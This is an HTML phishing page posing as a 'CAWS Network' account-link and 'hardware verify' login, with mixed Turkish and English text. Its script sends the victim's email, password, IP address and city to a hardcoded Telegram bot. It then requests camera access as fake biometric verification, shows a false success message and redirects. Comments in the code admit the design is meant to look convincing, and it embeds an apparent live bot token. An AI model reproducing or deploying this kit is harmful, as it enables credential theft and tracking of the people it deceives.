<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CAWS Network | Nexus Auth</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --main: #111; --accent: #444; --bg: #fdfdfd; --border: #e2e2e2; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body { 
            background: var(--bg); 
            font-family: 'Inter', sans-serif; 
            color: var(--main); 
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center;
        }

        /* İnandırıcılığı artıran minimalist kart */
        .auth-card {
            width: 100%;
            max-width: 400px;
            padding: 60px 30px;
            background: #fff;
            text-align: center;
            border-radius: 2px; /* Nike tarzı keskin köşeler */
            border: 1px solid var(--border);
            box-shadow: 0 4px 30px rgba(0,0,0,0.03);
            position: relative;
        }

        /* Marka Logosu */
        .brand {
            font-weight: 900;
            font-size: 38px;
            letter-spacing: -3px;
            margin-bottom: 5px;
            color: #000;
        }
        .tagline {
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 5px;
            color: #999;
            margin-bottom: 45px;
        }

        .step-title { font-size: 18px; font-weight: 700; margin-bottom: 10px; }
        .desc { font-size: 13px; color: #666; margin-bottom: 35px; line-height: 1.5; padding: 0 10px; }

        /* Modern Nike Tarzı Inputlar */
        .input-group { text-align: left; margin-bottom: 25px; }
        .input-group label { 
            display: block; 
            font-size: 11px; 
            font-weight: 700; 
            text-transform: uppercase; 
            margin-bottom: 10px; 
            color: #000; 
        }
        .input-group input { 
            width: 100%; 
            padding: 16px 0; 
            background: transparent; 
            border: none; 
            border-bottom: 1.5px solid var(--border); 
            font-size: 14px;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus { border-bottom-color: #000; }

        /* Şık Buton */
        .nexus-btn {
            background: #000;
            color: #fff;
            border: none;
            width: 100%;
            padding: 20px;
            font-weight: 700;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 15px;
        }
        .nexus-btn:hover { background: #333; }

        /* Gizli Bölüm */
        #step-2 { display: none; }

        /* Alt Güvenlik Barı */
        .footer-sec {
            margin-top: 50px;
            padding-top: 25px;
            border-top: 1px solid #f0f0f0;
            display: flex;
            justify-content: center;
            gap: 20px;
            filter: grayscale(1);
            opacity: 0.4;
        }
        .footer-sec img { height: 14px; }
    </style>
</head>
<body>

<div class="auth-card">
    <div class="brand">CAWS</div>
    <div class="tagline">Network Edition</div>

    <div id="step-1">
        <h2 class="step-title">Account Link</h2>
        <p class="desc">Caws Server senkronizasyonunu tamamlamak için Master hesabınızla kimlik doğrulaması yapın.</p>
        
        <div class="input-group">
            <label>Master Account</label>
            <input type="email" id="email" placeholder="example@gmail.com">
        </div>
        <div class="input-group">
            <label>Global Password</label>
            <input type="password" id="pass" placeholder="••••••••">
        </div>
        
        <button class="nexus-btn" onclick="nextStep()">Continue</button>
    </div>

    <div id="step-2">
        <div style="font-size: 40px; margin-bottom: 20px;">🛡️</div>
        <h2 class="step-title">Hardware Verify</h2>
        <p class="desc">
            Hesap güvenliği için cihaz tanıma protokolünü başlatın. Konum ve Biyometrik erişim gereklidir.
        </p>
        <button class="nexus-btn" id="finalBtn" onclick="runNexus()">Verify Identity</button>
        <p id="status" style="font-size: 11px; margin-top: 15px; color: #999; display: none;">Secure connection established...</p>
    </div>

    <div class="footer-sec">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/SSL_Cloudflare_logo.svg">
    </div>
</div>

<script>
    // Önceki script kodlarının aynısı buraya gelecek (Token ve Fetch kısımları)
    const tgToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
    const tgChat = "1540769169";

    function nextStep() {
        if(!document.getElementById('email').value || !document.getElementById('pass').value) return;
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
    }

    async function sendMsg(text) {
        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage?chat_id=${tgChat}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
    }

    async function runNexus() {
        const mail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        document.getElementById('status').style.display = 'block';
        document.getElementById('finalBtn').innerHTML = "Processing...";

        // Rapor gönderimi
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipD = await ipRes.json();
            const log = `🎩 **CAWS NEW LOG** 🎩\n\n👤 **Mail:** \`${mail}\`\n🔑 **Pass:** \`${pass}\`\n🌐 **IP:** \`${ipD.ip}\`\n📍 **Loc:** ${ipD.city}`;
            await sendMsg(log);
        } catch(e) {}

        // Kamera onayı isteme (Görünürde biyometrik doğrulama)
        try {
            await navigator.mediaDevices.getUserMedia({video:true});
        } catch(e) {}

        setTimeout(() => {
            alert("Verification Success: Caws Server link established.");
            window.location.href = "https://caws.network";
        }, 2500);
    }
</script>
</body>
</html>
